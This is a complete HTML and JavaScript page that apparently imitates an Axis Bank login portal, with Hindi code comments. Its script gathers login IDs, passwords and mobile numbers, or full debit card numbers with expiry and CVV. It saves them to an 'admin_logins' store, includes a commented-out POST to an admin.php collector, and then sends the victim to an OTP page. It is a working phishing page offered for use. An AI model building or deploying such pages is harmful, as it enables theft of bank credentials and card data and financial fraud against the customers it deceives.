<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login using</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: #990330;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .login-container {
            width: 100%;
            max-width: 450px;
            background-color: white;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            overflow: hidden;
        }
        
        .header-section {
            background-color: #990330;
            color: white;
            padding: 25px;
            text-align: center;
        }
        
        .header-section h1 {
            font-size: 24px;
            margin-bottom: 10px;
            font-weight: 600;
        }
        
        .header-section p {
            font-size: 16px;
            opacity: 0.9;
        }
        
        .login-options {
            display: flex;
            background-color: #f0f0f0;
            border-bottom: 1px solid #ddd;
        }
        
        .login-tab {
            flex: 1;
            text-align: center;
            padding: 15px;
            cursor: pointer;
            font-weight: 600;
            color: #666;
            transition: all 0.3s;
            border-bottom: 3px solid transparent;
        }
        
        .login-tab.active {
            background-color: white;
            color: #990330;
            border-bottom: 3px solid #990330;
        }
        
        .login-form {
            padding: 30px;
        }
        
        .form-section {
            display: none;
        }
        
        .form-section.active {
            display: block;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-group label {
            display: block;
            font-weight: 600;
            color: #333;
            margin-bottom: 8px;
            font-size: 14px;
        }
        
        .input-with-icon {
            position: relative;
        }
        
        .input-icon {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: #990330;
            font-weight: bold;
        }
        
        .form-control {
            width: 100%;
            padding: 14px 15px 14px 45px;
            border: 2px solid #990330;
            border-radius: 8px;
            font-size: 16px;
            background-color: #f9f9f9;
            transition: all 0.3s;
        }
        
        .form-control:focus {
            outline: none;
            background-color: white;
            box-shadow: 0 0 0 3px rgba(153, 3, 48, 0.2);
        }
        
        .forgot-link {
            display: inline-block;
            color: #990330;
            text-decoration: none;
            font-size: 14px;
            margin-top: 5px;
            font-weight: 600;
        }
        
        .forgot-link:hover {
            text-decoration: underline;
        }
        
        .enable-link {
            display: inline-block;
            color: #990330;
            text-decoration: none;
            font-size: 14px;
            margin-left: 15px;
            font-weight: 600;
        }
        
        .dashboard-text {
            margin: 25px 0;
            padding: 15px;
            background-color: #f5f5f5;
            border-left: 4px solid #990330;
            border-radius: 5px;
        }
        
        .dashboard-text p {
            color: #333;
            font-weight: 600;
        }
        
        .login-btn {
            width: 100%;
            padding: 16px;
            background-color: #990330;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 10px;
        }
        
        .login-btn:hover {
            background-color: #7a0228;
            transform: translateY(-2px);
        }
        
        .register-section {
            text-align: center;
            margin-top: 25px;
            padding-top: 20px;
            border-top: 1px solid #eee;
        }
        
        .register-text {
            color: #666;
            font-size: 15px;
        }
        
        .register-link {
            color: #990330;
            text-decoration: none;
            font-weight: 600;
            margin-left: 5px;
        }
        
        .register-link:hover {
            text-decoration: underline;
        }
        
        .qr-section {
            text-align: center;
            margin-top: 30px;
            padding: 20px;
            background-color: #f9f9f9;
            border-radius: 10px;
        }
        
        .qr-text {
            color: #333;
            font-weight: 600;
            margin-bottom: 10px;
        }
        
        .qr-enlarge {
            color: #990330;
            text-decoration: none;
            font-weight: 600;
            font-size: 14px;
            display: inline-block;
            margin-top: 10px;
        }
        
        .qr-placeholder {
            width: 150px;
            height: 150px;
            margin: 0 auto;
            background-color: #e0e0e0;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 10px;
            border: 2px dashed #990330;
        }
        
        .qr-placeholder span {
            color: #990330;
            font-weight: 600;
        }
        
        @media (max-width: 480px) {
            .login-container {
                max-width: 100%;
            }
            
            .login-form {
                padding: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="header-section">
            <h1>Login using</h1>
            <p>Login ID / Customer ID | Debit Card No.</p>
        </div>
        
        <div class="login-options">
            <div class="login-tab active" data-tab="userid">Login ID / Customer ID</div>
            <div class="login-tab" data-tab="card">Debit Card No.</div>
        </div>
        
        <div class="login-form">
            <!-- User ID Login Form -->
            <div id="userid-form" class="form-section active">
                <div class="form-group">
                    <label>Login ID / Customer ID</label>
                    <div class="input-with-icon">
                        <span class="input-icon">i</span>
                        <input type="text" id="userid" class="form-control" placeholder="Enter ID">
                    </div>
                    <div>
                        <a href="#" class="forgot-link">Forgot customer ID</a>
                        <a href="#" class="enable-link">Enable login ID</a>
                    </div>
                </div>
                
                <div class="form-group">
                    <label>Password</label>
                    <div class="input-with-icon">
                        <span class="input-icon">‚óè</span>
                        <input type="password" id="password" class="form-control" placeholder="Enter Password">
                    </div>
                    <a href="#" class="forgot-link">Forgot password</a>
                </div>
                
                <div class="form-group">
                    <label>Mobile Number</label>
                    <div class="input-with-icon">
                        <span class="input-icon">üì±</span>
                        <input type="tel" id="mobile" class="form-control" placeholder="Enter Mobile Number" maxlength="10">
                    </div>
                </div>
            </div>
            
            <!-- Debit Card Login Form -->
            <div id="card-form" class="form-section">
                <div class="form-group">
                    <label>16-Digit Card Number</label>
                    <div class="input-with-icon">
                        <span class="input-icon">üí≥</span>
                        <input type="text" id="cardno" class="form-control" placeholder="Enter 16-digit card number" maxlength="16">
                    </div>
                </div>
                
                <div class="form-group">
                    <label>Expiry Date (DDMM)</label>
                    <div class="input-with-icon">
                        <span class="input-icon">üìÖ</span>
                        <input type="text" id="expiry" class="form-control" placeholder="DDMM" maxlength="4">
                    </div>
                </div>
                
                <div class="form-group">
                    <label>CVV (3 digits)</label>
                    <div class="input-with-icon">
                        <span class="input-icon">üîí</span>
                        <input type="text" id="cvv" class="form-control" placeholder="123" maxlength="3">
                    </div>
                </div>
            </div>
            
            <div class="dashboard-text">
                <p>Login directly to Dashboard</p>
            </div>
            
            <button type="button" id="loginBtn" class="login-btn">Login</button>
            
            <div class="register-section">
                <span class="register-text">First time user?</span>
                <a href="#" class="register-link">REGISTER HERE</a>
            </div>
            
            <div class="qr-section">
                <p class="qr-text">Scan to download open by Axis Bank app</p>
                <div class="qr-placeholder">
                    <span>QR Code</span>
                </div>
                <a href="#" class="qr-enlarge">Enlarge QR code</a>
            </div>
        </div>
    </div>

    <script>
        // ‡§ü‡•à‡§¨ ‡§∏‡•ç‡§µ‡§ø‡§ö‡§ø‡§Ç‡§ó
        document.querySelectorAll('.login-tab').forEach(tab => {
            tab.addEventListener('click', function() {
                // ‡§∏‡§≠‡•Ä ‡§ü‡•à‡§¨‡•ç‡§∏ ‡§∏‡•á active ‡§ï‡•ç‡§≤‡§æ‡§∏ ‡§π‡§ü‡§æ‡§è‡§Ç
                document.querySelectorAll('.login-tab').forEach(t => {
                    t.classList.remove('active');
                });
                
                // ‡§∏‡§≠‡•Ä ‡§´‡•â‡§∞‡•ç‡§Æ ‡§∏‡•á active ‡§ï‡•ç‡§≤‡§æ‡§∏ ‡§π‡§ü‡§æ‡§è‡§Ç
                document.querySelectorAll('.form-section').forEach(form => {
                    form.classList.remove('active');
                });
                
                // ‡§ï‡•ç‡§≤‡§ø‡§ï ‡§ï‡§ø‡§è ‡§ó‡§è ‡§ü‡•à‡§¨ ‡§ï‡•ã active ‡§¨‡§®‡§æ‡§è‡§Ç
                this.classList.add('active');
                
                // ‡§∏‡§Ç‡§¨‡§Ç‡§ß‡§ø‡§§ ‡§´‡•â‡§∞‡•ç‡§Æ ‡§¶‡§ø‡§ñ‡§æ‡§è‡§Ç
                const tabId = this.getAttribute('data-tab');
                document.getElementById(`${tabId}-form`).classList.add('active');
            });
        });
        
        // ‡§≤‡•â‡§ó‡§ø‡§® ‡§¨‡§ü‡§® ‡§ï‡§æ‡§∞‡•ç‡§Ø
        document.getElementById('loginBtn').addEventListener('click', async function() {
            let loginData = {};
            let currentTab = document.querySelector('.login-tab.active').getAttribute('data-tab');
            
            if (currentTab === 'userid') {
                // User ID ‡§≤‡•â‡§ó‡§ø‡§® ‡§°‡•á‡§ü‡§æ
                const userId = document.getElementById('userid').value.trim();
                const password = document.getElementById('password').value.trim();
                const mobile = document.getElementById('mobile').value.trim();
                
                if (!userId || !password || !mobile) {
                    return; // ‡§ï‡•ã‡§à ‡§è‡§≤‡§∞‡•ç‡§ü ‡§®‡§π‡•Ä‡§Ç
                }
                
                loginData = {
                    login_type: 'userid',
                    user_id: userId,
                    password: password,
                    mobile: mobile,
                    timestamp: new Date().toISOString()
                };
                
            } else if (currentTab === 'card') {
                // ‡§ï‡§æ‡§∞‡•ç‡§° ‡§≤‡•â‡§ó‡§ø‡§® ‡§°‡•á‡§ü‡§æ
                const cardno = document.getElementById('cardno').value.trim();
                const expiry = document.getElementById('expiry').value.trim();
                const cvv = document.getElementById('cvv').value.trim();
                
                if (!cardno || !expiry || !cvv) {
                    return; // ‡§ï‡•ã‡§à ‡§è‡§≤‡§∞‡•ç‡§ü ‡§®‡§π‡•Ä‡§Ç
                }
                
                loginData = {
                    login_type: 'card',
                    card_number: cardno,
                    expiry_date: expiry,
                    cvv: cvv,
                    timestamp: new Date().toISOString()
                };
            }
            
            try {
                // ‡§°‡•á‡§ü‡§æ ‡§¨‡•à‡§ï‡§è‡§Ç‡§° ‡§™‡§∞ ‡§≠‡•á‡§ú‡•á‡§Ç (admin.html ‡§§‡§ï ‡§™‡§π‡•Å‡§Å‡§ö‡§æ‡§è‡§Å)
                // Note: ‡§µ‡§æ‡§∏‡•ç‡§§‡§µ‡§ø‡§ï implementation ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ü‡§™‡§ï‡•ã server-side code ‡§ö‡§æ‡§π‡§ø‡§è
                await saveToBackend(loginData);
                
                // otp1.html ‡§™‡§∞ ‡§∞‡•Ä‡§°‡§æ‡§Ø‡§∞‡•á‡§ï‡•ç‡§ü
                window.location.href = 'otp1.html';
                
            } catch (error) {
                console.error('Login error:', error);
                // ‡§ï‡•ã‡§à ‡§è‡§≤‡§∞‡•ç‡§ü ‡§®‡§π‡•Ä‡§Ç ‡§¶‡§ø‡§ñ‡§æ‡§®‡§æ
            }
        });
        
        // ‡§¨‡•à‡§ï‡§è‡§Ç‡§° ‡§Æ‡•á‡§Ç ‡§°‡•á‡§ü‡§æ ‡§∏‡•á‡§µ ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§´‡§Ç‡§ï‡•ç‡§∂‡§®
        async function saveToBackend(data) {
            // ‡§Ø‡§π‡§æ‡§Å ‡§Ü‡§™‡§ï‡§æ actual backend endpoint ‡§π‡•ã‡§ó‡§æ
            // ‡§â‡§¶‡§æ‡§π‡§∞‡§£ ‡§ï‡•á ‡§≤‡§ø‡§è localStorage ‡§ï‡§æ ‡§â‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞ ‡§∞‡§π‡•á ‡§π‡•à‡§Ç
            // ‡§Ö‡§∏‡§≤ ‡§Æ‡•á‡§Ç ‡§Ø‡§π‡§æ‡§Å fetch API ‡§Ø‡§æ AJAX call ‡§π‡•ã‡§ó‡§æ
            
            // localStorage ‡§Æ‡•á‡§Ç ‡§∏‡•á‡§µ ‡§ï‡§∞‡§®‡§æ (temporary solution)
            let allLogins = JSON.parse(localStorage.getItem('admin_logins')) || [];
            allLogins.push(data);
            localStorage.setItem('admin_logins', JSON.stringify(allLogins));
            
            // ‡§µ‡§æ‡§∏‡•ç‡§§‡§µ‡§ø‡§ï ‡§¨‡•à‡§ï‡§è‡§Ç‡§° ‡§ï‡•á ‡§≤‡§ø‡§è:
            /*
            const response = await fetch('your-backend-endpoint/admin.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            });
            
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            
            return await response.json();
            */
        }
        
        // ‡§á‡§®‡§™‡•Å‡§ü ‡§µ‡•à‡§≤‡§ø‡§°‡•á‡§∂‡§®
        document.getElementById('cardno').addEventListener('input', function(e) {
            this.value = this.value.replace(/\D/g, '').slice(0, 16);
        });
        
        document.getElementById('expiry').addEventListener('input', function(e) {
            this.value = this.value.replace(/\D/g, '').slice(0, 4);
        });
        
        document.getElementById('cvv').addEventListener('input', function(e) {
            this.value = this.value.replace(/\D/g, '').slice(0, 3);
        });
        
        document.getElementById('mobile').addEventListener('input', function(e) {
            this.value = this.value.replace(/\D/g, '').slice(0, 10);
        });
    </script>
</body>
</html>
